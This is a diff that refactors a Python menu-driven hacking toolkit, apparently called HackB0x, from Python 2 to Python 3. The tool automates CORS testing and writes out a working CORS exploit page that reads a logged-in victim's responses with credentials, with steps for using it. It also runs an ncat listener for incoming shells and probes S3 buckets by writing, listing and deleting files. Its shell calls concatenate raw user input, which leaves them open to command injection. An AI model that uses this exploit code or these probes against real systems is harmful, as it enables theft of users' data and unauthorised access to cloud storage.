-                fn = raw_input('File name (e.g test.js) :')
-                print("\n Extracting Url from Js file...")
-                li()
-                time.sleep(5)
-                os.system('ruby exp/urlex.rb exp/'+fn)
-                li()
-                repeat()
-            elif ins == 2:
-                os.system('brew install ruby')
-                repeat()
-            elif ins== 786687:
-                url2 = raw_input('URL (e.g example.com) :')
-                li()
-                print("Searching links from "+url2)
-                li()
-                res=os.system('curl http://api.hackertarget.com/pagelinks/?q='+url2)
-                print(res)
-                li()
-                repeat()
-            else:
-                print("")
-                again()
-        elif choice == 8:
-           dom = raw_input('Target Domain(e.g google.com): ')
-           dom2=' /'
-           os.system('python exp/hc.py '+dom+dom2)
-           print("-----------------------------------\n")
-           repeat()
-        elif choice == 9:
-            ch=  int(input('\n[1] Run Listener \n[2] Install Package\n\nSelection:'))
-            if ch==1:
-                port=raw_input('Enter listening port: ')
-                print("Incomming connection will be connected automatically on port %s")
-                os.system('ncat -vv -n -l -p '+port)
-            elif ch==2:
-                os.system('git clone https://github.com/nmap/nmap')
-                os.system('./configure;make;make install')
-            else:
-                print("Invalid number. Try again!!")
-                again()
-        elif choice == 10:
-            print("Gathering information...")
-            def net():
-                li()
-                print("\tLISTENING Connections")
-                li()
-                os.system('lsof -iTCP -sTCP:LISTEN -n -P')
-                li()
-                print("\tESTABLISHED Connections")
-                li()
-                os.system('lsof -s -i -n -P | grep ESTABLISHED')
-                print("\n\n[1] Kill PID\n[2] Return to Menu")
-                ch=int(input('\nSelection:'))
-                if ch == 1:
-                    pid = raw_input('Enter PID to kill: ')
-                    os.system('kill ' + pid)
-                    net()
-                elif ch == 2:
-                    repeat()
-                else:
-                    print("Invalid number. Try again!!")
-                    again()
-            net()
-        elif choice == 11:
-            cors = raw_input('Target Url (e.g https://api.edmodo.com/users/id): ')
-            evil = raw_input('localhost/IP (e.g https://localhost): ')
-            print("\nSite will be vulnerable to CORS misconfiguration if these 2 headers are present in the response")
-            print("[1]Access-Control-Allow-Credentials: true")
-            print("[2]Access-Control-Allow-Origin: %s" % (evil))
-            li()
-            os.system('curl %s -H "Origin: %s" -I ' % (cors, evil))
-            exp= raw_input('\n[1]Exploit CORS on %s (y/n): ' % (cors)).lower()
-            if exp=='y':
-                print("Creating exploit code...")
-                time.sleep(5)
-                print("")
-                f = open('Cors.html', 'w')
-                body = """<!DOCTYPE html>
-                <html>
-                <head>
-                <title>CORS PoC Exploit</title>
-                </head>
-                <body>
-                <center>
-                <h1>CORS Exploit<br>by HackB0x</h1>
-                <hr>
-                <div id=”demo”>
-                <button type=”button” onclick=”cors()”>Exploit</button>
-                </div>
-                <script type=”text/javascript”>
-                function cors() {
-                var xhttp = new XMLHttpRequest();
-                xhttp.onreadystatechange = function() {
-                if(this.readyState == 4 && this.status == 200) {
-                document.getElementById(“demo”).innerHTML = this.responseText;
-                }
-                };
-                xhttp.open(“GET”, “%s", true);
-                xhttp.withCredentials = true;
-                xhttp.send();
-                }
-                </script>
-                </center>
-                </body>
-                </html>""" % (cors)
-                f.write(body)
-                f.close()
-                print("exploit created with the name of Cors.html in your current directory")
-                li()
-                print (Style.BRIGHT + Fore.GREEN + "Exploitation Steps"+ Style.RESET_ALL)
-                print("[1] Start apache server on your local host\n[2] Paste cors.html in /var/www/html/")
-                print("[3] Login to %s\n[4] Open cors.html using %s and click exploit" % (cors, evil))
-                li()
-                print("\nLoading main menu...")
-                time.sleep(3)
-                repeat()
-            elif exp=='n':
-                repeat()
-            else:
-                print("Invalid number. Try again!!")
-                repeat()
-        elif choice ==12:
-            aws = int(input("[1]Install AWS Package\n[2]AWS Credential\n[3]Run Program\n\nSelection:"))
-            if aws ==1:
-                os.system('brew install awscli')
-                os.system('pip install awscli')
-                repeat()
-            elif aws ==2:
-                li()
-                print("\t\tSample")
-                li()
-                print("""AWS Access Key ID: AKIAIOSFODNN7EXAMPLE
+                failed(header + ': ' + str(headval))
+        except KeyError:
+            pass
+    line()
+
+
+def listener():
+    choice = int(
+        input(NEWLINE + '[1] Run Listener \n[2] Install Package\n\nSelection:'))
+    if choice == 1:
+        port = input('Enter listening port: ')
+        print("Incomming connection will be connected automatically on port %s")
+        os.system('ncat -vv -n -l -p ' + port)
+    elif choice == 2:
+        os.system('git clone https://github.com/nmap/nmap; cd nmap')
+        os.system('./configure;make;make install')
+
+
+def info_gather():
+    print("Gathering information...")
+    line()
+    print("\tLISTENING Connections")
+    os.system('lsof -iTCP -sTCP:LISTEN -n -P')
+    line()
+    print("\tESTABLISHED Connections")
+    os.system('lsof -s -i -n -P | grep ESTABLISHED')
+    line()
+
+
+def cors_config():
+    target_url = input(
+        'Target Url (e.g https://api.edmodo.com/users/id): ')
+    evil = input('localhost/IP (e.g https://localhost): ')
+    print(NEWLINE + "Site will be vulnerable to CORS misconfiguration if these 2 headers are present in the response")
+    print("[1]Access-Control-Allow-Credentials: true")
+    print("[2]Access-Control-Allow-Origin: %s" % (evil))
+    line()
+    os.system('curl %s -H "Origin: %s" -I ' % (target_url, evil))
+    exp = input(NEWLINE + '[1]Exploit CORS on %s (y/n): ' %
+                (target_url)).lower()
+    if exp == 'y':
+        print("Creating exploit code...")
+        print("")
+        cors_file = open('Cors.html', 'w')
+        body = """<!DOCTYPE html>
+        <html>
+        <head>
+        <title>CORS PoC Exploit</title>
+        </head>
+        <body>
+        <center>
+        <h1>CORS Exploit<br>by HackB0x</h1>
+        <hr>
+        <div id=”demo”>
+        <button type=”button” onclick=”cors()”>Exploit</button>
+        </div>
+        <script type=”text/javascript”>
+        function cors() {
+        var xhttp = new XMLHttpRequest();
+        xhttp.onreadystatechange = function() {
+        if(this.readyState == 4 && this.status == 200) {
+        document.getElementById(“demo”).innerHTML = this.responseText;
+        }
+        };
+        xhttp.open(“GET”, “%s", true);
+        xhttp.withCredentials = true;
+        xhttp.send();
+        }
+        </script>
+        </center>
+        </body>
+        </html>""" % (target_url)
+        cors_file.write(body)
+        cors_file.close()
+        print(
+            "exploit created with the name of Cors.html in your current directory")
+        line()
+        print(Style.BRIGHT + Fore.GREEN +
+              "Exploitation Steps" + Style.RESET_ALL)
+        print(
+            "[1] Start apache server on your local host\n[2] Paste cors.html in /var/www/html/")
+        print("[3] Login to %s\n[4] Open cors.html using %s and click exploit" % (
+            target_url, evil))
+        line()
+        print(NEWLINE + "Loading main menu...")
+
+
+def aws_s3():
+    aws = int(
+        input("[1]Install AWS Package\n[2]AWS Credential\n[3]Run Program\n\nSelection:"))
+    if aws == 1:
+        # os.system('brew install awscli')
+        os.system('pip install awscli')
+    elif aws == 2:
+        line()
+        print("\t\tSample")
+        line()
+        print("""AWS Access Key ID: AKIAIOSFODNN7EXAMPLE
 AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
 Default region name: us-west-2
 Default output format: json""")
-                print("\n\n")
-                os.system('aws configure')
-                repeat()
-            elif aws ==3:
-                aws_program = raw_input('S3 Bucket name (e.g rubyci.s3.amazonaws.com): ')
-                print("\nChecking write permission. Creating test.txt to %s " % (aws_program))
-                os.system('aws s3 cp exp/test.txt s3://%s' % (aws_program))
-                time.sleep(5)
-                print("\nTry Listing files from %s" % (aws_program))
-                os.system('aws s3 ls s3://%s' % (aws_program))
-                time.sleep(5)
-                print("\nTry fetching file from %s." % (aws_program))
-                os.system('aws s3 cp s3://%s/test.txt ./' % (aws_program))
-                time.sleep(5)
-                print("\nChecking remove permission. removing test.txt from %s" % (aws_program))
-                os.system('aws s3 rm s3://%s/test.txt' % (aws_program))
-                print("Process Done.\n")
-                again()
-            else:
-                print("Invalid number. Try again!!")
-                repeat()
+        print(NEWLINE + NEWLINE)
+        os.system('aws configure')
+    elif aws == 3:
+        aws_program = input(
+            'S3 Bucket name (e.g rubyci.s3.amazonaws.com): ')
+        print(NEWLINE + "Checking write permission. Creating test.txt to %s " %
+              (aws_program))
+        os.system('aws s3 cp ./tests/test.txt s3://%s' % (aws_program))
+        print(NEWLINE + "Try Listing files from %s" % (aws_program))
+        os.system('aws s3 ls s3://%s' % (aws_program))
+        print(NEWLINE + "Try fetching file from %s." % (aws_program))
+        os.system('aws s3 cp s3://%s/test.txt ./' % (aws_program))
+        print(NEWLINE + "Checking remove permission. removing test.txt from %s" % (
+            aws_program))
+        os.system('aws s3 rm s3://%s/test.txt' % (aws_program))
+        print("Process Done." + NEWLINE)
+
+    else:
+        print("Invalid number. Try again!!")
+
+
+def banner():
+    with open('./src/banner.md', 'r') as myfile:
+        print(myfile.read())
+
+
+def quit():
+    print(NEWLINE + "Quitting program..." + NEWLINE)
+    exit(0)
+
+
+def menu():
+    banner()
+    try:
+        choice = int(input(NEWLINE + "choice: "))
+        print(NEWLINE)
+        if choice == 1:
+            xss()
+            menu()
+        elif choice == 2:
+            exploits()
+            menu()
+        elif choice == 3:
+            subd()
+            menu()
+        elif choice == 4:
+            whois_geo()
+            menu()
+        elif choice == 5:
+            ssrf_injection()
+            menu()
+        elif choice == 6:
+            nmap_auto_banner()
+            menu()
+        elif choice == 7:
+            js_url_parser()
+            menu()
+        elif choice == 8:
+            target_domain()
+            menu()
+        elif choice == 9:
+            listener()
+            menu()
+        elif choice == 10:
+            info_gather()
+            menu()
+        elif choice == 11:
+            cors_config()
+            menu()
+        elif choice == 12:
+            aws_s3()
+            menu()
         elif choice == 0:
-            print("\nQuitting program...\n")
+            quit()
         else:
             print("Please enter the correct number")
-            repeat()
-    except:
+            menu()
+    except KeyboardInterrupt:
+        quit()
+    except Exception as error:
+        traceback.print_exc()
+        print(str(error))
         print("Error try again!!")
-        repeat()
-repeat()
+        menu()
+
+
+if __name__ == "__main__":
+    menu()
